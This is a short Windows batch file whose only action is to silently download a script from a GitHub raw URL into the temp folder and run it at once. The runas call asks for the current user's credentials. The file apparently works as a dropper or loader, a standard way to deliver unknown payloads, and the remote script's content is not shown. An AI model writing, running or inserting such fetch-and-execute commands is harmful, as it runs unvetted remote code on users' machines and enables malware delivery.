@echo off
runas /user:%USERNAME% "curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/script.bat -o \"%TEMP%\\script.bat\" && cmd /c call \"%TEMP%\\script.bat\""
